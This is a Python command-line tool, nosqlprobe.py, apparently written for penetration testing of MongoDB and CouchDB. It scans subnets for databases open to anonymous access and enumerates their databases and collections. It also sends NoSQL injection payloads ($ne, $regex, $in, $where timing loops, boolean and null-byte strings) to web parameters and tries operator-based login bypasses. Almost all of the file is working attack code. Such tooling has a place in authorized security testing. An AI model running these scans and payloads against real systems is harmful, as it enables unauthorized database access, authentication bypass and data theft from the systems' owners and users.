#!/usr/bin/env python3
"""
nosqlprobe.py – Pentest NoSQL DBs (MongoDB, CouchDB) & enhanced NoSQL injection tests
Supports:
  • Syntax injection (single-quote, quote-plus, syntax fuzz)
  • Boolean-based injection (AND, OR)
  • Null-byte termination
  • NoSQL operator injection ($ne, $regex, $in, nested- and top-level $where)
  • Timing-based injection
  • Authentication bypass via operator combinations on /login
  • Works over HTTP or HTTPS via -u/--url or Burp raw requests (-r)
Dependencies:
    pip3 install pymongo couchdb requests colorama validators
"""
import argparse
import csv
import sys
import ipaddress
import json
import os

from urllib.parse import urlparse, urlunparse, quote_plus, parse_qsl
from pymongo import MongoClient, errors as mongo_errors
import couchdb
import requests
import validators
from colorama import init as colorama_init, Fore

colorama_init(autoreset=True)

DEFAULT_PORTS = {'mongodb': 27017, 'couchdb': 5984}
COMMON_MONGO_DBS = ['admin', 'local', 'config', 'test']


def parse_args():
    p = argparse.ArgumentParser(prog='nosqlprobe',
                                description='Pentest NoSQL DBs & web apps')
    sub = p.add_subparsers(dest='command', required=True)

    db = sub.add_parser('db', help='MongoDB/CouchDB tests')
    db.add_argument('-e', '--engine', choices=['mongodb', 'couchdb'],
                    default='mongodb', help='Engine to target')
    db.add_argument('-t', '--target', required=True,
                    help='Host:port or CIDR (e.g.127.0.0.1:27017 or 10.0.0.0/24)')
    db.add_argument('-a', '--anonymous', action='store_true',
                    help='Check anonymous access')
    db.add_argument('--check-anonymous', action='store_true',
                    help='Alias for --anonymous')
    db.add_argument('-n', '--enum', action='store_true',
                    help='Enumerate DBs, collections & users')
    db.add_argument('-c', '--creds', help='Credentials user:pass')
    db.add_argument('-o', '--output', help='CSV file for enumeration')

    web = sub.add_parser('web', help='NoSQL injection tests on web apps')
    web.add_argument('-u', '--url', help='Target URL (http:// or https://)')
    web.add_argument('-d', '--data', help='POST data (form or raw JSON)')
    web.add_argument('-H', '--headers',
                     help='Custom headers; semicolon-separated')
    web.add_argument('-r', '--request',
                     help='Burp raw request file to replay')

    return p.parse_args()


def test_db_access(host, port, engine, creds=None):
    if engine == 'mongodb':
        try:
            opts = {'host': host, 'port': port,
                    'serverSelectionTimeoutMS': 5000}
            if creds:
                opts.update(username=creds[0],
                            password=creds[1], authSource='admin')
            c = MongoClient(**opts)
            c.admin.command('ping')
            return True, c.server_info().get('version', 'unknown'), None
        except mongo_errors.OperationFailure as e:
            return False, None, str(e)
        except Exception as e:
            return False, None, str(e)
    else:
        try:
            url = f"http://{host}:{port}/"
            if creds:
                url = f"http://{creds[0]}:{creds[1]}@{host}:{port}/"
            s = couchdb.Server(url)
            return True, s.version(), None
        except Exception as e:
            return False, None, str(e)


def detect_mongodb_mgmt(host):
    ui = f"http://{host}:28017"
    try:
        r = requests.get(ui, timeout=5)
        if r.status_code == 200:
            print(Fore.GREEN + f"[+] MongoDB HTTP UI at {ui}")
    except:
        pass


def detect_couchdb_ui(host, port):
    ui = f"http://{host}:{port}/_utils/"
    try:
        r = requests.get(ui, timeout=5)
        if r.status_code == 200:
            print(Fore.GREEN + f"[+] CouchDB Fauxton at {ui}")
    except:
        pass


def enumerate_mongodb(host, port, creds, csvw=None):
    try:
        opts = {'host': host, 'port': port,
                'serverSelectionTimeoutMS': 5000}
        if creds:
            opts.update(username=creds[0],
                        password=creds[1], authSource='admin')
        c = MongoClient(**opts)
        dbs = c.list_database_names()
    except mongo_errors.OperationFailure:
        print(Fore.YELLOW +
              "[!] listDatabases needs auth; using common DBs")
        dbs = COMMON_MONGO_DBS.copy()
        c = MongoClient(host=host, port=port,
                        serverSelectionTimeoutMS=5000)
    except Exception as e:
        print(Fore.RED + f"[!] MongoDB enumeration failed: {e}")
        return

    for db in dbs:
        print(Fore.CYAN + f"Database: {db}")
        try:
            cols = c[db].list_collection_names()
        except:
            cols = []
        for col in cols:
            print("  -", col)
            if csvw:
                csvw.writerow([db, col])


def enumerate_couchdb(host, port, creds, csvw=None):
    try:
        base = f"http://{host}:{port}/"
        if creds:
            base = f"http://{creds[0]}:{creds[1]}@{host}:{port}/"
        s = couchdb.Server(base)
        dbs = list(s)
    except Exception as e:
        print(Fore.RED + f"[!] CouchDB enumeration failed: {e}")
        return

    for db in dbs:
        print(Fore.CYAN + f"Database: {db}")
        if csvw:
            csvw.writerow([db, ''])


def parse_burp_request(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(path)
    lines = open(path, 'r', errors='ignore').read().splitlines()
    if not lines or ' ' not in lines[0]:
        raise ValueError("Bad request file")
    method, uri, _ = lines[0].split(' ', 2)
    hdrs = {}
    i = 1
    while i < len(lines) and lines[i]:
        if ':' in lines[i]:
            k, v = lines[i].split(':', 1)
            hdrs[k.strip()] = v.strip()
        i += 1
    body = '\n'.join(lines[i+1:]) if i+1 < len(lines) else ''

    parsed = urlparse(uri)
    if not parsed.scheme:
        host = hdrs.get('Host')
        uri = f"https://{host}{uri}"
    return method.upper(), uri, hdrs, body


def build_request_line(method, base, inj, data_json):
    p = urlparse(base)
    if method == 'GET':
        qs = '&'.join(f"{quote_plus(str(k))}={quote_plus(str(v))}"
                      for k, v in inj.items())
        return f"GET {p.path}?{qs} HTTP/1.1"
    else:
        if data_json:
            return (f"curl -X POST {base} "
                    f"-H 'Content-Type: application/json' -d '{json.dumps(inj)}'")
        else:
            b = '&'.join(f"{quote_plus(str(k))}={quote_plus(str(v))}"
                         for k, v in inj.items())
            return f"curl -X POST {base} -d '{b}'"


def handle_db(args):
    engine, target = args.engine, args.target
    creds = None
    if args.creds:
        if ':' in args.creds:
            creds = tuple(args.creds.split(':', 1))
        else:
            print(Fore.RED + "[!] --creds must be user:pass")
            sys.exit(1)

    # CIDR scan
    if '/' in target:
        if not (args.anonymous or args.check_anonymous):
            print(Fore.RED + "[!] CIDR requires --anonymous")
            sys.exit(1)
        try:
            net = ipaddress.ip_network(target, strict=False)
        except ValueError as e:
            print(Fore.RED + f"[!] Invalid subnet: {e}")
            sys.exit(1)
        results = []
        for ip in map(str, net):
            ok, ver, err = test_db_access(ip, DEFAULT_PORTS[engine], engine)
            if ok:
                print(Fore.GREEN + f"[+] {engine} anonymous on "
                      f"{ip}:{DEFAULT_PORTS[engine]} (v{ver})")
                if engine == 'mongodb':
                    detect_mongodb_mgmt(ip)
                else:
                    detect_couchdb_ui(ip, DEFAULT_PORTS[engine])
                results.append((ip, ver))
            else:
                print(Fore.YELLOW + f"[-] No anonymous on "
                      f"{ip}:{DEFAULT_PORTS[engine]} ({err})")
        if args.output:
            with open(args.output, 'w', newline='') as f:
                w = csv.writer(f)
                w.writerow(['host', 'version'])
                w.writerows(results)
        return

    # single host
    if ':' in target:
        host, ps = target.split(':', 1)
        try:
            port = int(ps)
        except ValueError:
            print(Fore.RED + "[!] Invalid port")
            sys.exit(1)
    else:
        host, port = target, DEFAULT_PORTS[engine]

    if not (validators.ipv4(host) or validators.domain(host)):
        print(Fore.RED + "[!] Invalid host/IP")
        sys.exit(1)

    if args.anonymous or args.check_anonymous:
        ok, ver, err = test_db_access(host, port, engine)
        if ok:
            print(Fore.GREEN + f"[+] {engine} anonymous on "
                  f"{host}:{port} (v{ver})")
            if engine == 'mongodb':
                detect_mongodb_mgmt(host)
            else:
                detect_couchdb_ui(host, port)
        else:
            print(Fore.RED + f"[-] No anonymous on {host}:{port} ({err})")
        if not args.enum:
            return

    if args.enum:
        ok, ver, err = test_db_access(host, port, engine, creds)
        if not ok:
            print(Fore.RED + f"[!] Authentication failed: {err}")
            sys.exit(1)
        csvw = None
        if args.output:
            f = open(args.output, 'w', newline='')
            csvw = csv.writer(f)
            if engine == 'mongodb':
                csvw.writerow(['database', 'collection'])
            else:
                csvw.writerow(['database', ''])
        if engine == 'mongodb':
            enumerate_mongodb(host, port, creds, csvw)
        else:
            enumerate_couchdb(host, port, creds, csvw)
        if csvw:
            f.close()


def handle_web(args):
    # 1) Load request or CLI
    if args.request:
        method, url_full, headers, raw = parse_burp_request(args.request)
        p = urlparse(url_full)
        base_url = urlunparse((p.scheme, p.netloc, p.path, '', '', ''))
        orig_params = dict(parse_qsl(p.query, keep_blank_values=True))
        json_body, data_json = None, False
        if method == 'POST' and raw:
            try:
                json_body = json.loads(raw)
                data_json = True
            except:
                orig_params = dict(parse_qsl(raw, keep_blank_values=True))
    else:
        method = 'POST' if args.data else 'GET'
        base_url = args.url
        headers = {}
        if args.headers:
            for h in args.headers.split(';'):
                if ':' in h:
                    k, v = h.split(':', 1)
                    headers[k.strip()] = v.strip()
        p = urlparse(base_url)
        if not p.scheme:
            base_url = 'https://' + base_url
        orig_params = {}
        json_body, data_json = None, False
        if args.data:
            t = args.data.strip()
            if t.startswith('{') and t.endswith('}'):
                json_body = json.loads(t)
                data_json = True
            else:
                orig_params = dict(parse_qsl(t, keep_blank_values=True))

    if not (args.request or args.url):
        print(Fore.RED + "[!] Web tests require --url or --request")
        sys.exit(1)

    # 2) Baseline request
    try:
        if method == 'GET':
            base_r = requests.get(base_url, params=orig_params,
                                  headers=headers, timeout=10)
        elif data_json:
            base_r = requests.post(base_url, json=json_body,
                                   headers=headers, timeout=10)
        else:
            base_r = requests.post(base_url, data=orig_params,
                                   headers=headers, timeout=10)
    except Exception as e:
        print(Fore.RED + f"[!] Baseline request failed: {e}")
        sys.exit(1)

    base_len = len(base_r.text)
    print(Fore.GREEN +
          f"[+] Baseline: {base_r.status_code} {base_r.reason}, len={base_len}")

    # 3) General injection tests
    tests = [
        ('$ne', 'operator $ne', lambda v: v),
        ('$regex', 'operator $regex', lambda _: '^.*$'),
        ('$in', 'operator $in',
         lambda _: ['admin', 'administrator', 'superadmin']),
        ('syntax', 'syntax fuzz',
         lambda _: '"`{\r;$Foo}\n$Foo \\xYZ\x00'),
        ('bool-false', 'boolean FALSE', lambda _: "' && 0 && 'x"),
        ('bool-true', 'boolean TRUE', lambda _: "' && 1 && 'x"),
        ('or', 'boolean OR', lambda _: "'||1||'"),
        ('null', 'null byte', lambda v: v + '\x00'),
        ('$where', 'nested $where',
         lambda _: "';for(var i=0;i<1e8;i++);return true;//'"),
        ('top$where', 'top-level $where',
         lambda _: "';for(var i=0;i<1e8;i++);return true;//'")
    ]

    found = []
    items = (json_body.items() if data_json else orig_params.items())

    for op, label, pfn in tests:
        print("\n" + Fore.YELLOW + f"[*] Testing {label}")
        for k, v in items:
            inj_params = None
            inj_body = None

            # Build payload
            if op in ('$ne', '$regex', '$in', '$where'):
                if data_json:
                    inj_body = json_body.copy()
                    if op == '$in':
                        inj_body[k] = {'$in': pfn(v)}
                    else:
                        inj_body[k] = {op: pfn(v)}
                else:
                    if method == 'GET':
                        inj_params = orig_params.copy()
                        if op == '$in':
                            inj_params[f"{k}[$in]"] = ','.join(pfn(v))
                        elif op == '$where':
                            inj_params[k] = pfn(v)
                        else:
                            inj_params[f"{k}[{op}]"] = (
                                v if op == '$ne' else pfn(v))
                    else:
                        if op == '$in':
                            inj_params = {f"{k}[$in]": ','.join(pfn(v))}
                        else:
                            inj_params = {
                                f"{k}[{op}]": (v if op == '$ne' else pfn(v))
                            }

            elif op == 'top$where':
                if data_json:
                    inj_body = json_body.copy()
                    inj_body['$where'] = pfn(v)
                else:
                    if method == 'GET':
                        inj_params = orig_params.copy()
                        inj_params['$where'] = pfn(v)
                    else:
                        inj_params = {'$where': pfn(v)}

            else:
                # syntax, boolean, null-byte
                pl = pfn(v)
                if data_json:
                    continue
                if method == 'GET':
                    inj_params = orig_params.copy()
                    inj_params[k] = pl
                else:
                    inj_params = {k: pl}

            # Send injection request
            try:
                if method == 'GET':
                    r = requests.get(base_url, params=inj_params,
                                     headers=headers, timeout=20)
                elif inj_body is not None:
                    r = requests.post(base_url, json=inj_body,
                                      headers=headers, timeout=20)
                else:
                    r = requests.post(base_url, data=inj_params,
                                      headers=headers, timeout=20)
            except Exception as e:
                print(Fore.RED + f"    [!] {k} request error: {e}")
                continue

            delta = abs(len(r.text) - base_len)
            vuln = (delta > 0) or (op == '$ne' and r.status_code >= 400)
            if vuln:
                req = r.request
                print(Fore.GREEN + f"  [+] {k} ({label}) "
                                   f"Δ={delta} status={r.status_code}")
                print(Fore.GREEN + "      --- HTTP REQUEST ---")
                line = req.path_url if req.body is None else req.url
                print(f"      {req.method} {line} HTTP/1.1")
                for hk, hv in req.headers.items():
                    print(f"      {hk}: {hv}")
                if req.body:
                    b = (req.body.decode()
                         if isinstance(req.body, bytes) else str(req.body))
                    for ln in b.splitlines():
                        print(f"      {ln}")
                print(Fore.GREEN + "      --- HTTP RESPONSE ---")
                print(f"      HTTP/1.1 {r.status_code} {r.reason}")
                for rk, rv in r.headers.items():
                    print(f"      {rk}: {rv}")
                for ln in r.text.splitlines():
                    print(f"      {ln}")
                found.append((k, label,
                              inj_body if inj_body is not None else inj_params,
                              r.status_code))
            else:
                print(f"  [-] {k} Δ={delta} status={r.status_code}")

    # --- Authentication-bypass on /login ---
    parsed_path = urlparse(base_url).path.lower()
    if method == 'POST' and parsed_path.endswith('/login'):
        print("\n" + Fore.YELLOW + "[*] Testing auth-bypass combos")
        # Determine original username
        orig_user = (json_body.get('username')
                     if data_json else orig_params.get('username', ''))

        scenarios = [
            ('user $ne', {'username': {'$ne': ''}}),
            ('user regex', {'username': {'$regex': orig_user + '.*'}}),
            ('both $ne', {'username': {'$ne': ''},
                          'password': {'$ne': ''}}),
            ('admin regex + $ne pw', {
                'username': {'$regex': 'admin.*'},
                'password': {'$ne': ''}
            })
        ]

        for label, payload in scenarios:
            print(Fore.YELLOW + f"  [*] {label}")
            if data_json:
                inj_body = json_body.copy()
                inj_body.update(payload)
                send_req = lambda: requests.post(
                    base_url, json=inj_body,
                    headers=headers, timeout=20)
            else:
                params = orig_params.copy()
                for fld, val in payload.items():
                    # remove original
                    params.pop(fld, None)
                    if isinstance(val, dict):
                        for op, opv in val.items():
                            params[f"{fld}[{op}]"] = opv
                    else:
                        params[fld] = val
                send_req = lambda: requests.post(
                    base_url, data=params,
                    headers=headers, timeout=20)

            try:
                r2 = send_req()
            except Exception as e:
                print(Fore.RED + f"    [!] auth request error: {e}")
                continue

            ok = ((r2.status_code in (200, 302))
                  and 'Invalid' not in r2.text)
            print(Fore.GREEN + f"    -> status={r2.status_code}, "
                               f"bypass={'yes' if ok else 'no'}")
            if ok:
                print(Fore.GREEN + f"      Payload: {json.dumps(payload) if data_json else payload}")

    # Summary
    if found:
        print("\n" + Fore.GREEN + "[+] Injection points:")
        for p, l, pay, st in found:
            print(f"    - Param: {p}, Type: {l}, Status: {st}")
            print(f"      Payload: {pay}")
    else:
        print("\n" + Fore.RED + "[-] No injections detected")


def main():
    args = parse_args()
    if args.command == 'web':
        handle_web(args)
    else:
        handle_db(args)


if __name__ == '__main__':
    main()
